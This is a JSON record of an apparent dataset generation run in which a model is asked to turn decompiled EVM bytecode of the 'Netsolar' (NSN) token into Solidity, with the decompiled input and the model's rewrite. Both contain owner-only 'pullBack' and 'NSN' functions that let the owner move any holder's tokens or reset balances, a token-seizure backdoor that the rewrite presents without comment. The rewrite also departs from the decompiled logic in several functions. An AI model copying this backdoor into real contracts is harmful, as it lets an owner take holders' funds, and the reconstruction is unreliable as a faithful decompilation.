{
	"address": "0x0b8f53f5cb26f27ecf46840c14cc93577221822d",
	"choices": [
		{
			"finish_reason": "stop",
			"index": 0,
			"message": {
				"content": "Here is the Solidity contract code based on the decompiled code:\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract MyContract {\n    mapping (address => uint256) private _balanceOf;\n    mapping (address => mapping (address => uint256)) private _allowance;\n    address private _owner;\n    uint256 private _totalSupply;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(address owner, uint256 initial_supply) {\n        _owner = owner;\n        _totalSupply = initial_supply;\n        _balanceOf[owner] = initial_supply;\n    }\n\n    function name() public pure returns (string memory) {\n        return \"Netsolar\";\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        _allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\n        require(value <= _balanceOf[from], \"Insufficient balance.\");\n        require(value <= _allowance[from][msg.sender], \"Insufficient allowance.\");\n        \n        _balanceOf[from] -= value;\n        _balanceOf[to] += value;\n        _allowance[from][msg.sender] -= value;\n        \n        emit Transfer(from, to, value);\n        return true;\n    }\n\n    function INITIAL_SUPPLY() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return 0;\n    }\n\n    function withdraw() public {\n        require(msg.sender == _owner, \"Only the contract owner can withdraw.\");\n        payable(_owner).transfer(address(this).balance);\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balanceOf[account];\n    }\n\n    function pullBack(address from, address to, uint256 value) public {\n        require(msg.sender == _owner, \"Only the contract owner can pull back.\");\n        require(value <= _balanceOf[from], \"Insufficient balance.\");\n        \n        _balanceOf[from] -= value;\n        _balanceOf[to] += value;\n        \n        emit Transfer(from, to, value);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return \"NSN\";\n    }\n\n    function transfer(address to, uint256 value) public returns (bool) {\n        require(value <= _balanceOf[msg.sender], \"Insufficient balance.\");\n        \n        _balanceOf[msg.sender] -= value;\n        _balanceOf[to] += value;\n        \n        emit Transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowance[owner][spender];\n    }\n\n    function NSN(address newOwner) public {\n        require(msg.sender == _owner, \"Only the contract owner can set a new owner.\");\n        _owner = newOwner;\n        _balanceOf[newOwner] = _totalSupply;\n    }\n\n    function transferOwnership(address newOwner) public {\n        require(msg.sender == _owner, \"Only the contract owner can transfer ownership.\");\n        require(newOwner != address(0), \"New owner is the zero address.\");\n        \n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n\n    fallback() external payable {\n        _balanceOf[msg.sender] += msg.value;\n        emit Transfer(address(0), msg.sender, msg.value);\n    }\n}\n```\nPlease note that the original decompiled code appears to be a bit inconsistent, so certain assumptions have been made for the Solidity code. It's always recommended to thoroughly test the contract before using it in production.",
				"role": "assistant"
			}
		}
	],
	"created": 1701466306,
	"id": "chatcmpl-8R5Os0xqqWEn5vWPFn0QerydXfdPl",
	"input_format": "DecompiledCode",
	"ir": "// Decompiled at www.contract-library.com\n// 2021.08.22 10:11 UTC\n\n// Data structures and variables inferred from the use of storage instructions\nuint256 stor_1; // STORAGE[0x1]\nmapping (uint256 => [uint256]) _balanceOf; // STORAGE[0x2]\nmapping (uint256 => [uint256]) _allowance; // STORAGE[0x4]\naddress _owner; // STORAGE[0x0] bytes 0 to 19\nuint8 _fallback; // STORAGE[0x5] bytes 0 to 0\nuint160 stor_3_0_19; // STORAGE[0x3] bytes 0 to 19\nuint256 _totalSupply; // STORAGE[0xac33ff75c19e70fe83507db0d683fd3465c996598dc972688b7ace676c89077b]\n\n// Events\nApproval(address, address, uint256);\nOwnershipTransferred(address, address);\nTransfer(address, address, uint256);\n\nfunction name() public nonPayable { \n    v0 = new array[](v1.length);\n    v2 = v3 = 0;\n    while (v2 < v1.length) {\n        MEM[v2 + v0.data] = MEM[v2 + v1.data];\n        v2 += 32;\n    }\n    if (8) {\n        MEM[v0.data] = ~0xffffffffffffffffffffffffffffffffffffffffffffffff & 'Netsolar';\n    }\n    return v0;\n}\n\nfunction approve(address varg0, uint256 varg1) public nonPayable { \n    _allowance[varg0] = varg1;\n    emit Approval(msg.sender, varg0, varg1);\n    return 1;\n}\n\nfunction totalSupply() public nonPayable { \n    MEM[0] = 0;\n    MEM[32] = 2;\n    return stor_1 - _totalSupply;\n}\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public nonPayable { \n    require(varg1);\n    require(varg2 <= _balanceOf[varg0]);\n    require(varg2 <= _allowance[msg.sender]);\n    assert(varg2 <= _balanceOf[varg0]);\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\n    assert(varg2 + _balanceOf[varg1] >= _balanceOf[varg1]);\n    _balanceOf[varg1] += varg2;\n    assert(varg2 <= _allowance[msg.sender]);\n    _allowance[msg.sender] = _allowance[msg.sender] - varg2;\n    emit Transfer(varg0, varg1, varg2);\n    return 1;\n}\n\nfunction INITIAL_SUPPLY() public nonPayable { \n    return 0xb2d05e00;\n}\n\nfunction decimals() public nonPayable { \n    return 0;\n}\n\nfunction withdraw() public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    v0 = _owner.call().value(this.balance).gas(!this.balance * 2300);\n    require(v0); // checks call status, propagates error data on error\n}\n\nfunction balanceOf(address varg0) public nonPayable { \n    return _balanceOf[varg0];\n}\n\nfunction pullBack(address varg0, address varg1, uint256 varg2) public nonPayable { \n    require(msg.sender == _owner);\n    require(varg2 >= _balanceOf[varg1]);\n    assert(varg2 + _balanceOf[varg1] >= _balanceOf[varg1]);\n    _balanceOf[varg1] += varg2;\n    assert(varg2 + _balanceOf[varg0] >= _balanceOf[varg0]);\n    _balanceOf[varg0] += varg2;\n    emit Transfer(varg1, varg0, varg2);\n}\n\nfunction owner() public nonPayable { \n    return _owner;\n}\n\nfunction symbol() public nonPayable { \n    v0 = new array[](v1.length);\n    v2 = v3 = 0;\n    while (v2 < v1.length) {\n        MEM[v2 + v0.data] = MEM[v2 + v1.data];\n        v2 += 32;\n    }\n    if (3) {\n        MEM[v0.data] = 0x4e534e0000000000000000000000000000000000000000000000000000000000;\n    }\n    return v0;\n}\n\nfunction transfer(address varg0, uint256 varg1) public nonPayable { \n    require(varg1 <= _balanceOf[msg.sender]);\n    assert(varg1 <= _balanceOf[msg.sender]);\n    _balanceOf[msg.sender] = _balanceOf[msg.sender] - varg1;\n    assert(varg1 + _balanceOf[varg0] >= _balanceOf[varg0]);\n    _balanceOf[varg0] += varg1;\n    emit Transfer(msg.sender, varg0, varg1);\n    return 1;\n}\n\nfunction allowance(address varg0, address varg1) public nonPayable { \n    return _allowance[varg1];\n}\n\nfunction NSN(address varg0) public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    stor_3_0_19 = varg0;\n    stor_1 = 0xb2d05e00;\n    _balanceOf[varg0] = 0xb2d05e00;\n}\n\nfunction transferOwnership(address varg0) public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    require(varg0);\n    emit OwnershipTransferred(_owner, varg0);\n    _owner = varg0;\n}\n\nfunction fallback() public payable { \n    assert(_fallback);\n    _balanceOf[msg.sender] += msg.value / STORAGE[5];\n    emit Transfer(0, msg.sender, msg.value / STORAGE[5]);\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(uint32 function_selector) public payable { \n    MEM[64] = 128;\n    if (msg.data.length >= 4) {\n        if (function_selector == 0x6fdde03) {\n            name();\n        } else if (0x95ea7b3 == function_selector) {\n            approve(address,uint256);\n        } else if (0x18160ddd == function_selector) {\n            totalSupply();\n        } else if (0x23b872dd == function_selector) {\n            transferFrom(address,address,uint256);\n        } else if (0x2ff2e9dc == function_selector) {\n            INITIAL_SUPPLY();\n        } else if (0x313ce567 == function_selector) {\n            decimals();\n        } else if (0x3ccfd60b == function_selector) {\n            withdraw();\n        } else {\n            if (0x70a08231 != function_selector) {\n                if (0x77eefa5a == function_selector) {\n                    pullBack(address,address,uint256);\n                } else if (0x8da5cb5b == function_selector) {\n                    owner();\n                } else if (0x8fe47625 != function_selector) {\n                    if (0x95d89b41 == function_selector) {\n                        symbol();\n                    } else if (0xa9059cbb == function_selector) {\n                        transfer(address,uint256);\n                    } else if (0xdd62ed3e == function_selector) {\n                        allowance(address,address);\n                    } else if (0xe87d31b6 == function_selector) {\n                        NSN(address);\n                    } else if (0xf2fde38b == function_selector) {\n                        transferOwnership(address);\n                    }\n                }\n            }\n            balanceOf(address);\n        }\n    }\n    fallback();\n}\n",
	"language": "Solidity",
	"messages": [
		{
			"content": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.",
			"role": "system"
		},
		{
			"content": "The following is the decompiled code: // Decompiled at www.contract-library.com\n// 2021.08.22 10:11 UTC\n\n// Data structures and variables inferred from the use of storage instructions\nuint256 stor_1; // STORAGE[0x1]\nmapping (uint256 => [uint256]) _balanceOf; // STORAGE[0x2]\nmapping (uint256 => [uint256]) _allowance; // STORAGE[0x4]\naddress _owner; // STORAGE[0x0] bytes 0 to 19\nuint8 _fallback; // STORAGE[0x5] bytes 0 to 0\nuint160 stor_3_0_19; // STORAGE[0x3] bytes 0 to 19\nuint256 _totalSupply; // STORAGE[0xac33ff75c19e70fe83507db0d683fd3465c996598dc972688b7ace676c89077b]\n\n// Events\nApproval(address, address, uint256);\nOwnershipTransferred(address, address);\nTransfer(address, address, uint256);\n\nfunction name() public nonPayable { \n    v0 = new array[](v1.length);\n    v2 = v3 = 0;\n    while (v2 < v1.length) {\n        MEM[v2 + v0.data] = MEM[v2 + v1.data];\n        v2 += 32;\n    }\n    if (8) {\n        MEM[v0.data] = ~0xffffffffffffffffffffffffffffffffffffffffffffffff & 'Netsolar';\n    }\n    return v0;\n}\n\nfunction approve(address varg0, uint256 varg1) public nonPayable { \n    _allowance[varg0] = varg1;\n    emit Approval(msg.sender, varg0, varg1);\n    return 1;\n}\n\nfunction totalSupply() public nonPayable { \n    MEM[0] = 0;\n    MEM[32] = 2;\n    return stor_1 - _totalSupply;\n}\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public nonPayable { \n    require(varg1);\n    require(varg2 <= _balanceOf[varg0]);\n    require(varg2 <= _allowance[msg.sender]);\n    assert(varg2 <= _balanceOf[varg0]);\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\n    assert(varg2 + _balanceOf[varg1] >= _balanceOf[varg1]);\n    _balanceOf[varg1] += varg2;\n    assert(varg2 <= _allowance[msg.sender]);\n    _allowance[msg.sender] = _allowance[msg.sender] - varg2;\n    emit Transfer(varg0, varg1, varg2);\n    return 1;\n}\n\nfunction INITIAL_SUPPLY() public nonPayable { \n    return 0xb2d05e00;\n}\n\nfunction decimals() public nonPayable { \n    return 0;\n}\n\nfunction withdraw() public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    v0 = _owner.call().value(this.balance).gas(!this.balance * 2300);\n    require(v0); // checks call status, propagates error data on error\n}\n\nfunction balanceOf(address varg0) public nonPayable { \n    return _balanceOf[varg0];\n}\n\nfunction pullBack(address varg0, address varg1, uint256 varg2) public nonPayable { \n    require(msg.sender == _owner);\n    require(varg2 >= _balanceOf[varg1]);\n    assert(varg2 + _balanceOf[varg1] >= _balanceOf[varg1]);\n    _balanceOf[varg1] += varg2;\n    assert(varg2 + _balanceOf[varg0] >= _balanceOf[varg0]);\n    _balanceOf[varg0] += varg2;\n    emit Transfer(varg1, varg0, varg2);\n}\n\nfunction owner() public nonPayable { \n    return _owner;\n}\n\nfunction symbol() public nonPayable { \n    v0 = new array[](v1.length);\n    v2 = v3 = 0;\n    while (v2 < v1.length) {\n        MEM[v2 + v0.data] = MEM[v2 + v1.data];\n        v2 += 32;\n    }\n    if (3) {\n        MEM[v0.data] = 0x4e534e0000000000000000000000000000000000000000000000000000000000;\n    }\n    return v0;\n}\n\nfunction transfer(address varg0, uint256 varg1) public nonPayable { \n    require(varg1 <= _balanceOf[msg.sender]);\n    assert(varg1 <= _balanceOf[msg.sender]);\n    _balanceOf[msg.sender] = _balanceOf[msg.sender] - varg1;\n    assert(varg1 + _balanceOf[varg0] >= _balanceOf[varg0]);\n    _balanceOf[varg0] += varg1;\n    emit Transfer(msg.sender, varg0, varg1);\n    return 1;\n}\n\nfunction allowance(address varg0, address varg1) public nonPayable { \n    return _allowance[varg1];\n}\n\nfunction NSN(address varg0) public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    stor_3_0_19 = varg0;\n    stor_1 = 0xb2d05e00;\n    _balanceOf[varg0] = 0xb2d05e00;\n}\n\nfunction transferOwnership(address varg0) public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    require(varg0);\n    emit OwnershipTransferred(_owner, varg0);\n    _owner = varg0;\n}\n\nfunction fallback() public payable { \n    assert(_fallback);\n    _balanceOf[msg.sender] += msg.value / STORAGE[5];\n    emit Transfer(0, msg.sender, msg.value / STORAGE[5]);\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(uint32 function_selector) public payable { \n    MEM[64] = 128;\n    if (msg.data.length >= 4) {\n        if (function_selector == 0x6fdde03) {\n            name();\n        } else if (0x95ea7b3 == function_selector) {\n            approve(address,uint256);\n        } else if (0x18160ddd == function_selector) {\n            totalSupply();\n        } else if (0x23b872dd == function_selector) {\n            transferFrom(address,address,uint256);\n        } else if (0x2ff2e9dc == function_selector) {\n            INITIAL_SUPPLY();\n        } else if (0x313ce567 == function_selector) {\n            decimals();\n        } else if (0x3ccfd60b == function_selector) {\n            withdraw();\n        } else {\n            if (0x70a08231 != function_selector) {\n                if (0x77eefa5a == function_selector) {\n                    pullBack(address,address,uint256);\n                } else if (0x8da5cb5b == function_selector) {\n                    owner();\n                } else if (0x8fe47625 != function_selector) {\n                    if (0x95d89b41 == function_selector) {\n                        symbol();\n                    } else if (0xa9059cbb == function_selector) {\n                        transfer(address,uint256);\n                    } else if (0xdd62ed3e == function_selector) {\n                        allowance(address,address);\n                    } else if (0xe87d31b6 == function_selector) {\n                        NSN(address);\n                    } else if (0xf2fde38b == function_selector) {\n                        transferOwnership(address);\n                    }\n                }\n            }\n            balanceOf(address);\n        }\n    }\n    fallback();\n}\n.",
			"role": "user"
		}
	],
	"model": "gpt-4-32k",
	"object": "chat.completion",
	"prompts": "You are an experienced smart contract developer that excels at Solidity program languages. Please write a contract code by the following decompiled code lifted from EVM Bytecode.The following is the decompiled code: // Decompiled at www.contract-library.com\n// 2021.08.22 10:11 UTC\n\n// Data structures and variables inferred from the use of storage instructions\nuint256 stor_1; // STORAGE[0x1]\nmapping (uint256 => [uint256]) _balanceOf; // STORAGE[0x2]\nmapping (uint256 => [uint256]) _allowance; // STORAGE[0x4]\naddress _owner; // STORAGE[0x0] bytes 0 to 19\nuint8 _fallback; // STORAGE[0x5] bytes 0 to 0\nuint160 stor_3_0_19; // STORAGE[0x3] bytes 0 to 19\nuint256 _totalSupply; // STORAGE[0xac33ff75c19e70fe83507db0d683fd3465c996598dc972688b7ace676c89077b]\n\n// Events\nApproval(address, address, uint256);\nOwnershipTransferred(address, address);\nTransfer(address, address, uint256);\n\nfunction name() public nonPayable { \n    v0 = new array[](v1.length);\n    v2 = v3 = 0;\n    while (v2 < v1.length) {\n        MEM[v2 + v0.data] = MEM[v2 + v1.data];\n        v2 += 32;\n    }\n    if (8) {\n        MEM[v0.data] = ~0xffffffffffffffffffffffffffffffffffffffffffffffff & 'Netsolar';\n    }\n    return v0;\n}\n\nfunction approve(address varg0, uint256 varg1) public nonPayable { \n    _allowance[varg0] = varg1;\n    emit Approval(msg.sender, varg0, varg1);\n    return 1;\n}\n\nfunction totalSupply() public nonPayable { \n    MEM[0] = 0;\n    MEM[32] = 2;\n    return stor_1 - _totalSupply;\n}\n\nfunction transferFrom(address varg0, address varg1, uint256 varg2) public nonPayable { \n    require(varg1);\n    require(varg2 <= _balanceOf[varg0]);\n    require(varg2 <= _allowance[msg.sender]);\n    assert(varg2 <= _balanceOf[varg0]);\n    _balanceOf[varg0] = _balanceOf[varg0] - varg2;\n    assert(varg2 + _balanceOf[varg1] >= _balanceOf[varg1]);\n    _balanceOf[varg1] += varg2;\n    assert(varg2 <= _allowance[msg.sender]);\n    _allowance[msg.sender] = _allowance[msg.sender] - varg2;\n    emit Transfer(varg0, varg1, varg2);\n    return 1;\n}\n\nfunction INITIAL_SUPPLY() public nonPayable { \n    return 0xb2d05e00;\n}\n\nfunction decimals() public nonPayable { \n    return 0;\n}\n\nfunction withdraw() public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    v0 = _owner.call().value(this.balance).gas(!this.balance * 2300);\n    require(v0); // checks call status, propagates error data on error\n}\n\nfunction balanceOf(address varg0) public nonPayable { \n    return _balanceOf[varg0];\n}\n\nfunction pullBack(address varg0, address varg1, uint256 varg2) public nonPayable { \n    require(msg.sender == _owner);\n    require(varg2 >= _balanceOf[varg1]);\n    assert(varg2 + _balanceOf[varg1] >= _balanceOf[varg1]);\n    _balanceOf[varg1] += varg2;\n    assert(varg2 + _balanceOf[varg0] >= _balanceOf[varg0]);\n    _balanceOf[varg0] += varg2;\n    emit Transfer(varg1, varg0, varg2);\n}\n\nfunction owner() public nonPayable { \n    return _owner;\n}\n\nfunction symbol() public nonPayable { \n    v0 = new array[](v1.length);\n    v2 = v3 = 0;\n    while (v2 < v1.length) {\n        MEM[v2 + v0.data] = MEM[v2 + v1.data];\n        v2 += 32;\n    }\n    if (3) {\n        MEM[v0.data] = 0x4e534e0000000000000000000000000000000000000000000000000000000000;\n    }\n    return v0;\n}\n\nfunction transfer(address varg0, uint256 varg1) public nonPayable { \n    require(varg1 <= _balanceOf[msg.sender]);\n    assert(varg1 <= _balanceOf[msg.sender]);\n    _balanceOf[msg.sender] = _balanceOf[msg.sender] - varg1;\n    assert(varg1 + _balanceOf[varg0] >= _balanceOf[varg0]);\n    _balanceOf[varg0] += varg1;\n    emit Transfer(msg.sender, varg0, varg1);\n    return 1;\n}\n\nfunction allowance(address varg0, address varg1) public nonPayable { \n    return _allowance[varg1];\n}\n\nfunction NSN(address varg0) public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    stor_3_0_19 = varg0;\n    stor_1 = 0xb2d05e00;\n    _balanceOf[varg0] = 0xb2d05e00;\n}\n\nfunction transferOwnership(address varg0) public nonPayable { \n    require(msg.sender == _owner);\n    require(msg.sender == _owner);\n    require(varg0);\n    emit OwnershipTransferred(_owner, varg0);\n    _owner = varg0;\n}\n\nfunction fallback() public payable { \n    assert(_fallback);\n    _balanceOf[msg.sender] += msg.value / STORAGE[5];\n    emit Transfer(0, msg.sender, msg.value / STORAGE[5]);\n}\n\n// Note: The function selector is not present in the original solidity code.\n// However, we display it for the sake of completeness.\n\nfunction __function_selector__(uint32 function_selector) public payable { \n    MEM[64] = 128;\n    if (msg.data.length >= 4) {\n        if (function_selector == 0x6fdde03) {\n            name();\n        } else if (0x95ea7b3 == function_selector) {\n            approve(address,uint256);\n        } else if (0x18160ddd == function_selector) {\n            totalSupply();\n        } else if (0x23b872dd == function_selector) {\n            transferFrom(address,address,uint256);\n        } else if (0x2ff2e9dc == function_selector) {\n            INITIAL_SUPPLY();\n        } else if (0x313ce567 == function_selector) {\n            decimals();\n        } else if (0x3ccfd60b == function_selector) {\n            withdraw();\n        } else {\n            if (0x70a08231 != function_selector) {\n                if (0x77eefa5a == function_selector) {\n                    pullBack(address,address,uint256);\n                } else if (0x8da5cb5b == function_selector) {\n                    owner();\n                } else if (0x8fe47625 != function_selector) {\n                    if (0x95d89b41 == function_selector) {\n                        symbol();\n                    } else if (0xa9059cbb == function_selector) {\n                        transfer(address,uint256);\n                    } else if (0xdd62ed3e == function_selector) {\n                        allowance(address,address);\n                    } else if (0xe87d31b6 == function_selector) {\n                        NSN(address);\n                    } else if (0xf2fde38b == function_selector) {\n                        transferOwnership(address);\n                    }\n                }\n            }\n            balanceOf(address);\n        }\n    }\n    fallback();\n}\n.",
	"status": "1",
	"time_cost": 43.08605337142944,
	"usage": {
		"completion_tokens": 847,
		"prompt_tokens": 1757,
		"total_tokens": 2604
	}
}